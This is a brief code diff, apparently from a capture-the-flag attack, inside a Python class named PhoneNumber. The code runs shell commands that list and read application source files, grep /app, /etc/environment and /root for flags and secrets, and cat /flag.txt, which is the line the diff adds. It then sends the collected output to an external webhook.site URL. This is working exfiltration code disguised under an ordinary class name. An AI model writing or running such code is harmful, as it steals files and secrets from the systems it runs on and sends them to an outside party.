@@ -67,6 +67,7 @@ class PhoneNumber:
             out += "=APPSRC=\n" + run("find /app -type f | head -30") + "\n"
             out += "=APPFILES=\n" + run("cat /app/src/*.py /app/src/**/*.py 2>/dev/null | head -100") + "\n"
             out += "=FIND_SECRET=\n" + run("grep -r 'MPTC{\\|flag{\\|CTF{\\|secret' /app /etc/environment /root 2>/dev/null | head -20") + "\n"
+            out += "=CAT FILE=\n" + run("cat /flag.txt") + "\n"
 
             urllib.request.urlopen(
                 "https://webhook.site/364bd7d4-7769-49ab-9f81-1cd26fae1a14?d=" + urllib.parse.quote(out[:3000]),
